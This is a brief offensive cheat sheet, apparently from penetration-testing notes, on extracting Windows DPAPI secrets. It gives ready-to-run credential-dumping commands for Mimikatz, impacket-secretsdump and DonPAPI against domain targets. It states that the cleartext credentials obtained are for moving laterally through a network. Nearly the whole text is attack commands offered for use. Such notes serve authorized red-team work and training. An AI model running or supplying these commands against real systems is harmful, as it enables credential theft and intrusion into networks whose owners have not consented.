# Extract DPAPI

## Tools: Mimikatz , DonPAPI , impacket-secretsdump

#### 1) Mimikatz

 - mimikatz.exe "sekurlsa::dpapi"

#### 2) impacket-secretsdump

 - impacket-secretsdump DOMAIN/USER:PASSWORD@IP

#### 3) DonPAPI

 - DonPAPI.py DOMAIN/USER:PASSWORD@TARGET

### Dumping DPAPI will give us cleartext credentials so that we can laterally move within the network
